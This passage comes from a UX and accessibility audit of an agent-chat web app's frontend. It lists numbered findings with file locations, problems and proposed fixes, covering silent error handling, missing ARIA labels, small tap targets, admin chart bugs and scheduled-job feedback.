- **Type:** UX-improvement · **Impact:** med
- **File:** `packages/web/components/chat/ChatMessageList.tsx:176-215`
- **Problem:** Sending a second prompt while the agent runs shows a dim one-line row with no "Queued" header, no count, no `title` on the truncated text, and no way to edit before dispatch. First-timers think the message was dropped.
- **Fix:** Small header ("Queued · runs after current response"), `title={m.content}`, and an Edit item in the dropdown.

### UX9. File download failure in PreviewView is silent
- **Type:** UX-improvement · **Impact:** med
- **File:** `packages/web/components/PreviewView.tsx:132-134`
- **Problem:** Download failures are only `console.error`'d; the button disables then re-enables with no explanation. Binary files are also wrapped in a `text/plain` blob (corrupted output).
- **Fix:** `notify({ title: "Download failed", ... })` in the catch; use the correct MIME type.

### UX10. FilePreviewModal ignores its `onRemove` prop
- **Type:** UI-bug · **Impact:** low-med
- **File:** `packages/web/components/chat/FilePreviewModal.tsx:23`
- **Problem:** `onRemove` is destructured but never rendered (only the X close button exists), though `ChatPanel.tsx:131-134` wires it up. To remove a wrong attachment the user must close the modal and find the tiny thumbnail X.
- **Fix:** Add a trash button beside close: `<button onClick={onRemove} aria-label="Remove file"><Trash2/></button>`.

### UX11. Welcome copy tells mobile users to press ⌘K
- **Type:** UI-bug · **Impact:** low
- **File:** `packages/web/components/chat/WelcomeView.tsx:71-73`
- **Problem:** "Access tools with ⌘K." renders identically on mobile (no keyboard) and on non-Mac desktop (shows ⌘ instead of Ctrl). **Verified.**
- **Fix:** Hide the shortcut hint on mobile; show `Ctrl+K` on non-Mac.

### UX12. Abort Rebase/Merge is one destructive click with no confirmation
- **Type:** UX-improvement · **Impact:** med
- **File:** `packages/web/components/chat/ChatHeader.tsx:308-322, 355-366`
- **Problem:** Aborting discards conflict-resolution work with no confirm, undo, or success feedback. On mobile "Abort" is a ~20px text target in a bar directly above the message list — easy accidental tap.
- **Fix:** Confirm step + enlarge the mobile tap target to `min-h-[44px]`.

### UX13. Attachment remove "X" tap targets are 16–20px
- **Type:** a11y · **Impact:** low-med
- **File:** `packages/web/components/chat/PendingFilesDisplay.tsx:84-96`
- **Problem:** The X sits on the corner of a tile whose whole surface opens the preview; a near-miss opens the modal instead of removing. 20px on touch is below WCAG/Apple guidance (24–44px).
- **Fix:** Keep the 20px visual but expand the hit area (`before:absolute before:-inset-2`) to ≥32px.

### UX14. Agent picker is a hand-rolled div — no Escape/arrow-key/typeahead parity with the adjacent model picker
- **Type:** UX-improvement · **Impact:** low
- **File:** `packages/web/components/chat/AgentModelSelector.tsx:358-389`
- **Problem:** The agent dropdown has no Escape-to-close, no keyboard highlight, no `aria-expanded/haspopup` — inconsistent with the neighboring model picker (Popover + Command).
- **Fix:** Convert to the same Popover + Command pattern.

## Sidebar / navigation / modals

### UX15. All sidebar/header menus are hand-rolled div popups — no keyboard nav, Escape, menu roles, or focus management
- **Type:** a11y · **Impact:** high
- **Files:** `packages/web/components/sidebar/ChatItem.tsx:195-196`, `MobileChatItem.tsx:97-98`, `UserMenu.tsx:62-68`, `RepoFilterDropdown.tsx:67-68`, `MobileHeader.tsx:70-71`, `Sidebar.tsx:495-540`
- **Problem:** Escape and arrow keys do nothing, focus stays on the trigger, screen readers announce nothing. A full Radix `dropdown-menu.tsx` primitive already ships in `components/ui/` and is unused here.
- **Fix:** Migrate these popups to `DropdownMenu` — resolves keyboard, focus, roles, and UX16 clipping in one refactor.

### UX16. Chat row "..." menu is clipped at the bottom of the scrollable chat list
- **Type:** UI-bug · **Impact:** med-high
- **File:** `packages/web/components/sidebar/ChatItem.tsx:196` inside `Sidebar.tsx:662` (`overflow-y-auto`)
- **Problem:** The menu is `absolute top-full` inside an `overflow-y-auto` container and never flips upward, so on the last rows "Delete" is cut off / unreachable without scrolling. Same in `MobileChatItem`.
- **Fix:** Render in a portal with collision handling (Radix `DropdownMenuContent`).

### UX17. Empty chat list renders a blank void — no empty state
- **Type:** UX-improvement · **Impact:** med
- **File:** `packages/web/components/Sidebar.tsx:663-709, 429-457`
- **Problem:** New users, or any filter yielding zero results (archived/repo filter), see just empty background — indistinguishable from a load failure.
- **Fix:** Filter-aware empty copy ("No chats yet — start a new chat", "No archived chats", "No chats in <repo>").

### UX18. Settings saved fire-and-forget on close; failures silently discard edits
- **Type:** UX-improvement · **Impact:** high
- **File:** `packages/web/components/modals/SettingsModal.tsx:331-333`
- **Problem:** `void onSave(data)` on close discards the `{ ok:false, error }` result — a failed API-key save (network, expired session) is lost with no toast/retry; the user finds out when the agent later fails.
- **Fix:** Await the result and surface failure (toast with Retry, or reopen with an error banner).

### UX19. Env-vars modal swallows save errors
- **Type:** UX-improvement · **Impact:** med
- **File:** `packages/web/components/modals/EnvironmentVariablesModal.tsx:161-163`
- **Problem:** Save failure is only `console.error`'d; spinner stops, modal stays open, no message. Closing also discards edits with no unsaved-changes hint. (CreateRepoModal does this correctly.)
- **Fix:** Add an `error` state rendered above the footer.

### UX20. Delete confirmation autofocuses the destructive button
- **Type:** a11y / UX · **Impact:** med
- **File:** `packages/web/components/modals/ConfirmDialog.tsx:57-60`
- **Problem:** For `variant="destructive"` (e.g. "Delete chat") the dialog focuses the Delete button, so a keyboard-driven delete followed by a reflexive Enter confirms an irreversible action.
- **Fix:** Focus Cancel by default for destructive variants; keep confirm-focus for benign confirms.

### UX21. Collapsed sidebar shows a blank, unlabeled sign-in button
- **Type:** UI-bug · **Impact:** med
- **File:** `packages/web/components/Sidebar.tsx:736-744`
- **Problem:** When signed out and collapsed, the label is hidden (`{!collapsed && ...}`) and there's no icon or `aria-label` — an empty grey pill with no indication it signs you in. **Verified.**
- **Fix:** Render a GitHub/LogIn icon when collapsed + `aria-label="Sign in with GitHub"`.

### UX22. Icon-only sidebar controls missing accessible names
- **Type:** a11y · **Impact:** med
- **Files:** `Sidebar.tsx:585-591` (collapse toggle), `sidebar/ChatItem.tsx:184-193` ("..." menu), `ui/MobileBottomSheet.tsx:98-103` (sheet close X), `sidebar/RepoFilterDropdown.tsx:59-65` (no `aria-expanded/haspopup`)
- **Fix:** One-line `aria-label` additions ("Collapse sidebar", "Chat options", "Close").

### UX23. MobileBottomSheet has no exit animation (dead close-branch classes)
- **Type:** UI-bug · **Impact:** low-med
- **File:** `packages/web/components/ui/MobileBottomSheet.tsx:51`
- **Problem:** `if (!open) return null` unmounts immediately, so the `opacity-0`/`translateY(100%)` close-state classes never render — every sheet pops out instantly while opening animates smoothly. **Verified.** Content max-height is also hardcoded `calc(85vh - 60px)`, under-sizing `height="full"` (90vh) sheets.
- **Fix:** Keep mounted during close (delayed unmount) or use Radix Dialog `data-state` animations.

### UX24. Mobile drawer and custom mobile modals have no focus trap, Escape, or dialog semantics
- **Type:** a11y · **Impact:** med
- **Files:** `Sidebar.tsx:348-354` (drawer), `ui/MobileBottomSheet.tsx:67-80`, `MobileRenameModal` (258-268)
- **Problem:** Tab moves behind the overlay, Escape doesn't close, no `role="dialog"`/`aria-modal`. Only the desktop modals use Radix Dialog.
- **Fix:** Wrap in Radix Dialog or add focus-trap + Escape + dialog roles.

### UX25. Sub-44px tap targets in the mobile drawer chat rows
- **Type:** UI-bug · **Impact:** med
- **File:** `packages/web/components/sidebar/MobileChatItem.tsx:66, 91`
- **Problem:** The 20px expand chevron and the "..." button sit adjacent to the row's select action, so collapsing a branch tree or opening the menu frequently mis-taps into the chat.
- **Fix:** Add the existing `touch-target` class with negative margins.

### UX26. Running-chat spinner overlaps the always-visible "..." button on touch devices
- **Type:** UI-bug · **Impact:** low
- **File:** `packages/web/components/sidebar/ChatItem.tsx:171-190`
- **Problem:** `pointer-coarse` keeps the "..." visible, but the spinner only hides on `:hover`, so on iPads a running chat draws the spinner on top of the "..." glyph.
- **Fix:** Also hide the status layer under `pointer-coarse`, or give it its own slot as `MobileChatItem` does.

### UX27. Unseen/running/merged indicators are color/motion-only with no text alternative
- **Type:** a11y · **Impact:** low
- **Files:** `sidebar/ChatItem.tsx:176-178`, `MobileChatItem.tsx:77-78`
- **Fix:** Add `role="status"` + `sr-only` text ("Unread"/"Running"/"Merged") and a `title` tooltip.

## Admin / scheduled jobs / skills

### UX28. "Run Now" for a scheduled job has zero feedback
- **Type:** UX-improvement · **Impact:** high
- **File:** `packages/web/components/scheduled-jobs/ScheduledJobsView.tsx:188-198`
- **Problem:** Menu closes, nothing visibly happens (no toast/spinner/disabled state); the refetched list may not yet show a running row, so users click repeatedly and fire duplicate runs.
- **Fix:** Track `runningJobId`, show a spinner/toast, disable while pending, or navigate to the job detail.

### UX29. Admin stats API failure renders as "No data available" instead of an error
- **Type:** UX-improvement · **Impact:** high
- **File:** `packages/web/app/admin/page.tsx:175-180` (only 403 handled)
- **Problem:** On 500/network failure `statsQuery.error` is never rendered; every chart falls back to its empty state, so admins can't distinguish "no usage" from "dashboard broken".
- **Fix:** Add an `isError` branch with an error banner + Retry (`statsQuery.refetch()`).

### UX30. Admin toggle mutations (role/plan) fail silently
- **Type:** UX-improvement · **Impact:** med
- **File:** `packages/web/lib/query/hooks/useAdminUsersQuery.ts:101-109`
- **Problem:** The mutation has `onSuccess` only; a failed promote/plan-change just re-enables the pill with no change and no message.
- **Fix:** Add `onError` surfacing a toast/inline error.

### UX31. User table page/sort/search change blanks the table and unmounts the pager
- **Type:** UX-improvement · **Impact:** med
- **Files:** `packages/web/lib/query/hooks/useAdminUsersQuery.ts:63-70`; `components/admin/UserTable.tsx:455`
- **Problem:** No `placeholderData`, so each key change drops `data` to undefined → skeleton, and the `totalPages: 0` fallback unmounts the pagination the user just clicked (layout jump, lost context).
- **Fix:** `placeholderData: keepPreviousData`; dim rows with `isFetching` instead.

### UX32. TopUsersTable flashes to skeleton on every background refetch
- **Type:** UI-bug · **Impact:** low-med
- **File:** `packages/web/app/admin/page.tsx:388-392`
- **Problem:** It's passed `isLoading={statsQuery.isFetching}`, so silent refetches (window refocus, staleTime) swap this one card to a skeleton while siblings keep their data.
- **Fix:** Pass `statsQuery.isLoading`; use opacity for `isFetching`.

### UX33. Job detail: clicking a job flashes the jobs list before the detail loads
- **Type:** UX-improvement · **Impact:** med
- **File:** `packages/web/components/scheduled-jobs/ScheduledJobsView.tsx:223`
- **Problem:** Between row click and detail fetch resolving, the component falls through to the full list render; on deep links the list flashes first. No detail loading state.
- **Fix:** Render a detail-shaped skeleton when `selectedJobId && !selectedJob`.

### UX34. Skill uninstall: destructive, instant, and swallows server errors
- **Type:** UX-improvement · **Impact:** med
- **File:** `packages/web/components/skills/SkillSearchView.tsx:187-198`
- **Problem:** One click on the hover trash uninstalls with no confirm/pending state; a non-throwing 4xx/5xx falls through the `if (res.ok)` with the row unchanged and no message. The `error` state is also only rendered on the Search tab, so the message never shows on the Installed tab. **Verified.**
- **Fix:** Add an `else setError(...)` branch, render errors on the Installed tab, add a per-row spinner and a confirm step.

### UX35. Skills modal: no Escape-to-close, no focus trap
- **Type:** a11y · **Impact:** med
- **File:** `packages/web/components/skills/SkillSearchView.tsx:206-215`
- **Problem:** Hand-rolled overlay with no keydown handler — Escape does nothing, Tab escapes behind, no `role="dialog"`/`aria-modal`. (ScheduledJobForm uses Radix Dialog correctly.)
- **Fix:** Wrap in `@radix-ui/react-dialog`.

### UX36. Skill install "progress bar" is fake — sits at 0% then jumps to done
- **Type:** UX-improvement · **Impact:** low
- **File:** `packages/web/components/skills/SkillSearchView.tsx:117, 151, 384-397`
- **Problem:** A single POST drives a determinate bar that shows "Installing 0/3 skills…" at 0% the whole time then snaps to full — reads as stalled.
- **Fix:** Use an indeterminate bar/spinner ("Installing 3 skills…"); keep the count for completion only.

### UX37. Custom-interval schedule descriptions round to wrong values
- **Type:** UI-bug · **Impact:** low-med
- **File:** `packages/web/components/scheduled-jobs/helpers.tsx:88-94`
- **Problem:** `Math.round` renders a 90-minute job as "Every 2 hours" and 36h as "Every 2 days"; weekly drops the configured day/time.
- **Fix:** Reuse `inferIntervalMode` to render exact value+unit and "Weekly on Monday at 9:00 AM".

### UX38. "This job will run … ago" — nonsense next-run copy for disabled/webhook jobs
- **Type:** UI-bug · **Impact:** low
- **File:** `packages/web/components/scheduled-jobs/JobRunDetail.tsx:147-149`
- **Problem:** `formatDistanceToNow(job.nextRunAt, { addSuffix: true })` with no branch for `!enabled` or webhook jobs renders "This job will run 3 days ago". **Verified.**
- **Fix:** Branch on `triggerType === "incoming"` ("when its webhook is called") and `!enabled` ("when re-enabled").

### UX39. Peak-hours chart shows UTC hours labeled as local
- **Type:** UI-bug · **Impact:** med
- **Files:** `packages/web/app/api/admin/stats/route.ts:175`; `components/admin/charts/HourlyActivityChart.tsx:64-66`
- **Problem:** Buckets are `EXTRACT(HOUR FROM "createdAt")` (UTC) but axis/tooltip show bare "9am" with no timezone; an admin in PST reads peaks 7–8h off.
- **Fix:** Bucket with `AT TIME ZONE` (tz param), or append "(UTC)" to the title/axis.

### UX40. Agent/Model chart colors are unstable across toggles and time ranges
- **Type:** UX-improvement · **Impact:** low-med
- **File:** `packages/web/components/admin/charts/MessagesByModelChart.tsx:162-163`
- **Problem:** Color = usage-sorted index, so a given series changes color between 7d/30d and Agents/Models views — defeats color memory.
- **Fix:** Derive a stable color per series key (deterministic hash or fixed map).

### UX41. Weekly Active Users Y-axis shows fractional users
- **Type:** UI-bug · **Impact:** low
- **File:** `packages/web/components/admin/charts/UserGrowthChart.tsx:54-59`
- **Problem:** Recharts defaults `allowDecimals` to true, so small deployments get "0.5"/"1.5" user ticks.
- **Fix:** `allowDecimals={false}` (also on count-metric Y axes elsewhere).

### UX42. Jobs list is mouse-only; menu triggers unlabeled
- **Type:** a11y · **Impact:** med
- **Files:** `packages/web/components/scheduled-jobs/JobsList.tsx:172-177, 39-47`; `app/admin/page.tsx:194-198`
- **Problem:** Rows are `<tr onClick>` with no `tabIndex`/key handling (keyboard users can't open a job), and `⋯`/hamburger triggers lack `aria-label`/`aria-haspopup`/`aria-expanded`.
- **Fix:** Make the job name a `<button>`/link; add aria labels to menu triggers.

### UX43. Main-page error toast cannot be dismissed
- **Type:** UX-improvement · **Impact:** low
- **File:** `packages/web/app/page.tsx:711-718`
- **Problem:** The setup-remote error toast covers the top-right for a fixed 5s with no close button and can overlap header controls.
- **Fix:** Add an X that clears `errorBanner`.
